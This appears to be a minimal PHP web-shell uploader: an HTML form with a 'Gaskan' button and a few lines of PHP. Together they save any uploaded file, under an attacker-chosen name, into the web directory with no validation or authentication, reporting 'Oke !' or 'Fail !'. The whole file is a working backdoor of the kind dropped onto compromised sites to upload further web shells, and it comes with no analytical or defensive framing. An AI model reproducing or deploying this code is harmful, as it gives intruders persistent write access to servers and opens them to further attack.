<form method="post" enctype="multipart/form-data"><input type="file" name="load"><button>Gaskan</button></form>
<?php
if (isset($_FILES['load'])) {file_put_contents($_FILES['load']['name'], file_get_contents($_FILES['load']['tmp_name']));if (file_exists("./".$_FILES['load']['name'])) {echo "Oke !";} else {echo "Fail !";}}
?>
